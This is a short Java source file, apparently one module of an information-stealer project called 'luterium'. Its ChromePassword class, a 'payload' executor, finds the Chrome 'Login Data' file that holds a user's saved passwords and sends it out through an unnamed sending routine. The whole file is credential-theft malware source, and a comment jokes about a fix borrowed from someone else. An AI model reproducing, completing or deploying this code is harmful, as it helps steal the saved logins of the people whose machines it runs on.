package dev.peter.luterium.features;

import dev.peter.luterium.Main;
import dev.peter.luterium.payload.PayloadExecutor;
import dev.peter.luterium.utils.FileUtil;

import java.io.File;
import java.util.Optional;

/**
 @author Peter
 @since 08/14/2022
 **/

public class ChromePassword implements PayloadExecutor {
    public Main main = new Main();

    @Override
    public void execute() throws Exception
    {
        Optional<File> file = FileUtil.getFile(System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data");

        file.ifPresent(main.theThing::send); // I hope it's fixed thanks to yoink lol.
    }
}
